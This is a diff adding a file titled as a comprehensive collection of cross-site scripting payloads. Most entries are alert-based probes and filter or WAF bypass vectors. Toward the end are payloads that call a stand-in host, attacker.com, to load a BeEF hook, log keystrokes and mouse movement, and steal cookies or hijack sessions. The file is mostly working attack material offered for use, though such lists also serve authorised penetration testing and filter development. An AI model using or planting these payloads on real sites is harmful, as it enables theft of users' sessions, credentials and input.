@@ -1,0 +1,266 @@
+# XSS Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: Cross-Site Scripting
+
+# ============================================
+# BASIC XSS
+# ============================================
+
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+<svg onload=alert('XSS')>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1)>0</meter>
+
+# ============================================
+# REFLECTED XSS
+# ============================================
+
+"><script>alert(1)</script>
+"><script>alert(document.cookie)</script>
+'-alert(1)-'
+'-alert(document.cookie)-'
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+<script>alert(1)</script>
+<ScRiPt>alert(1)</sCrIpT>
+<scr\x69pt>alert(1)</scr\x69pt>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</ScRiPt>
+
+# ============================================
+# STORED XSS
+# ============================================
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<div style="background-image:url(javascript:alert(1))">
+<meta http-equiv="refresh" content="0;javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+
+# ============================================
+# DOM-BASED XSS
+# ============================================
+
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+<div onclick="alert(1)">click</div>
+<span onmouseover="alert(1)">hover</span>
+<input onfocus="alert(1)" autofocus>
+<details open ontoggle="alert(1)">
+
+# ============================================
+# EVENT HANDLERS
+# ============================================
+
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onblur=alert(1)>
+<svg onload=alert(1)>
+<svg onerror=alert(1)>
+<marquee onstart=alert(1)>
+<marquee onfinish=alert(1)>
+<video onerror=alert(1)>
+<audio onerror=alert(1)>
+<img onerror=alert(1)>
+<img onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<animate onbegin=alert(1)>
+<set attributeName=onmouseover to=alert(1)>
+
+# ============================================
+# POLYGOT XSS
+# ============================================
+
+javascript:alert(1)
+<svg/onload=alert(1)>
+<img src=x:alert(1)>
+<svg><a><animate attributeName=href onbegin=alert(1)>
+<svg><desc><![CDATA[><script>alert(1)</script>]]>
+<img src="x:alert(1)" onerror="alert(1)">
+<svg><x><![CDATA[><script>alert(1)</script>]]>
+<iframe srcdoc="<script>alert(1)</script>">
+<form action="javascript:alert(1)"><input type=submit>
+<isindex action="javascript:alert(1)" type=submit>
+<animate href="javascript:alert(1)">
+
+# ============================================
+# BYPASSING FILTERS - TAG BYPASS
+# ============================================
+
+<svg onload=alert(1)>
+<IMG SRC=javascript:alert(1)>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+<script>al\u0065rt(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<svg><script>alert(1)</script></svg>
+
+# ============================================
+# BYPASSING FILTERS - ATTRIBUTE BYPASS
+# ============================================
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+'"><script>alert(1)</script>
+'"><img src=x onerror=alert(1)>
+
+# ============================================
+# JAVASCRIPT INJECTION
+# ============================================
+
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:alert(document.domain)
+javascript:alert(document.location)
+javascript:prompt('XSS')
+javascript:confirm('XSS')
+data:text/html,<script>alert(1)</script>
+data:text/html,<img src=x onerror=alert(1)>
+
+# ============================================
+# META TAG INJECTION
+# ============================================
+
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="set-cookie" content="XSS=malicious">
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<link rel="import" href="javascript:alert(1)">
+
+# ============================================
+# STYLE INJECTION
+# ============================================
+
+<div style="background-image:url(javascript:alert(1))">
+<div style="background:url(javascript:alert(1))">
+<div style="expression(alert(1))">
+<style>@import'javascript:alert(1)'</style>
+<style>body{-moz-binding:url(https://example.com/xss.xml#xss)}</style>
+
+# ============================================
+# ANGULAR JS
+# ============================================
+
+{{constructor}}
+{{constructor.name}}
+{{'a'.constructor.prototype}}
+{{''.constructor.prototype}}
+{{x=y.getOwnPropertyNames(x)}}
+{{x.toString()}}
+<x ng-model>
+<x ng:repeat>
+
+# ============================================
+# VUE.JS
+# ============================================
+
+{{constructor}}
+{{constructor.name}}
+{{$data}}
+{{_c}}
+v-on:click=alert(1)
+@click=alert(1)
+v-bind:href=alert(1)
+:href=alert(1)
+
+# ============================================
+# REACT
+# ============================================
+
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+{alert(1)}
+{{alert(1)}}
+
+# ============================================
+# WAF BYPASS
+# ============================================
+
+<scr\x69pt>alert(1)</scr\x69pt>
+<scri%00pt>alert(1)</scri%00pt>
+<script>al\u0065rt(1)</script>
+<scr\u0069pt>alert(1)</scr\u0069pt>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+
+# ============================================
+# STORED POLYGOT
+# ============================================
+
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<img src=x:alert(1) onerror=alert(1)>
+<svg><x><![CDATA[><script>alert(1)</script>]]>
+
+# ============================================
+# BEEF HOOK
+# ============================================
+
+<script src="http://attacker.com/hook.js"></script>
+<img src="x" onerror="document.write('<script src=\'http://attacker.com/hook.js\'></script>')">
+
+# ============================================
+# KEYLOGGER
+# ============================================
+
+<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?key='+e.key}</script>
+<script>document.onmousemove=function(e){new Image().src='http://attacker.com/log?x='+e.clientX+'&y='+e.clientY}</script>
+
+# ============================================
+# COOKIE STEALING
+# ============================================
+
+<script>new Image().src="http://attacker.com/steal?cookie="+document.cookie;</script>
+<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+<meta http-equiv="set-cookie" content="XSS=malicious">
+
+# ============================================
+# SESSION HIJACKING
+# ============================================
+
+<script>
+fetch('https://attacker.com/hijack?session='+document.cookie)
+.then(response => response.text())
+.then(data => console.log(data))
+</script>
+
+# ============================================
+# MODERN XSS VECTORS
+# ============================================
+
+<template><template/onload=alert(1)>
+<details open ontoggle=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x>
+<svg><set attributeName=href to=javascript:alert(1)>
+<svg><a><animate attributeName=href from=javascript:alert(1) to=1>
+<svg><foreignObject><img src=x onerror=alert(1)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></math>
+
